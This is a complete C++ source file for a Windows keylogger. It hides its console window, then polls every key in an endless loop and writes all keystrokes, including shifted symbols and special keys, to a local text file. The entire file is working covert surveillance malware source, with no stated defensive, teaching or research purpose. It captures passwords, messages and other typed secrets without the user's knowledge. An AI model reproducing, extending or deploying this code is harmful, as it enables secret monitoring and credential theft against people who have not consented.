#include <Windows.h>
#include <WinUser.h>
#include <fstream>
#include <iostream>

using namespace std;



// Hide the app window
void hideAppWindow() {
	HWND consoleWindow;
	AllocConsole();
	consoleWindow = GetConsoleWindow();
	ShowWindow(consoleWindow, 0);
}



// Main
int main() {

	//Hide the app window
	hideAppWindow();

	char keyPressed;

	ofstream logFile("Keylogs.txt", ios::out);

	while (true) {

		Sleep(0);
		for (keyPressed = 8; keyPressed < 128; keyPressed += 1) {


			if (GetAsyncKeyState(keyPressed) == -32767) {

				// Special actions
				switch (keyPressed) {
				// Space
				case VK_SPACE:
					logFile << " ";
					logFile.flush();
					break;

				// Tab
				case VK_TAB:
					logFile << "|TAB|";
					logFile.flush();
					break;

				// Del
				case VK_DELETE:
					logFile << "|DEL|";
					logFile.flush();
					break;

				// Esc
				case VK_ESCAPE:
					logFile << "|ESC|";
					logFile.flush();
					break;

				// Enter
				case VK_RETURN:
					logFile << "|ENTER|";
					logFile.flush();
					break;

				// Caps Lock
				case VK_CAPITAL:
					logFile << "|CAPSLOCK|";
					logFile.flush();
					break;

				// Up Arrow
				case VK_UP:
					logFile << "|UP_ARROW|";
					logFile.flush();
					break;

				// Down Arrow
				case VK_DOWN:
					logFile << "|DOWN_ARROW|";
					logFile.flush();
					break;

				// Right Arrow
				case VK_RIGHT:
					logFile << "|RIGHT_ARROW|";
					logFile.flush();
					break;


				// Left Arrow
				case VK_LEFT:
					logFile << "|LEFT_ARROW|";
					logFile.flush();
					break;
				}



				// Caps Lock toggle
				bool isToggledCapsLock = GetKeyState(VK_CAPITAL) & 1;


				// Lower case and Uppercase case
				if (keyPressed >= 65 && keyPressed <= 90) {

					if (isToggledCapsLock && (GetKeyState(VK_SHIFT) & 0x8000)) {
						keyPressed += 32;
					}
					else if (!isToggledCapsLock && !(GetKeyState(VK_SHIFT) & 0x8000)) {
						keyPressed += 32;
					}

					logFile << keyPressed;
					logFile.flush();
					break;
				}



				// Numbers
				if (keyPressed >= 48 && keyPressed <= 57) {

					// Numbers with shift
					if (GetKeyState(VK_SHIFT) & 0x8000) {

						switch (keyPressed) {
						case '0':
							keyPressed = ')';
							break;
						case '1':
							keyPressed = '!';
							break;
						case '2':
							keyPressed = '@';
							break;
						case '3':
							keyPressed = '#';
							break;
						case '4':
							keyPressed = '$';
							break;
						case '5':
							keyPressed = '%';
							break;
						case '6':
							keyPressed = '^';
							break;
						case '7':
							keyPressed = '&';
							break;
						case '8':
							keyPressed = '*';
							break;
						case '9':
							keyPressed = '(';
							break;
						}

					}


					logFile << keyPressed;
					logFile.flush();
					break;

				}
			}



			// Special chars like []; ' , . / \ - = and theri SHIFT combination _ + { } : " < > ?
			// [ and {
			if (GetAsyncKeyState(VK_OEM_4) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '{' : result = '[';

				logFile << result;
				logFile.flush();
			}

			// ] and }
			if (GetAsyncKeyState(VK_OEM_6) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '}' : result = ']';

				logFile << result;
				logFile.flush();
			}

			// ; and :
			if (GetAsyncKeyState(VK_OEM_1) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = ':' : result = ';';

				logFile << result;
				logFile.flush();
			}

			// ' and "
			if (GetAsyncKeyState(VK_OEM_7) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '"' : result = '\'';

				logFile << result;
				logFile.flush();
			}

			// , and <
			if (GetAsyncKeyState(VK_OEM_COMMA) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '<' : result = ',';

				logFile << result;
				logFile.flush();
			}

			// . and >
			if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '>' : result = '.';

				logFile << result;
				logFile.flush();
			}

			// / and ?
			if (GetAsyncKeyState(VK_OEM_2) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '?' : result = '/';

				logFile << result;
				logFile.flush();
			}

			// | and \ 
			if (GetAsyncKeyState(VK_OEM_5) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '|' : result = '\\';

				logFile << result;
				logFile.flush();
			}


			// - and _ 
			if (GetAsyncKeyState(VK_OEM_MINUS) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '_' : result = '-';

				logFile << result;
				logFile.flush();
			}

			// = and +
			if (GetAsyncKeyState(VK_OEM_PLUS) == -32767) {
				char result;

				GetKeyState(VK_SHIFT) & 0x8000 ? result = '+' : result = '=';

				logFile << result;
				logFile.flush();
			}


		}
	}
}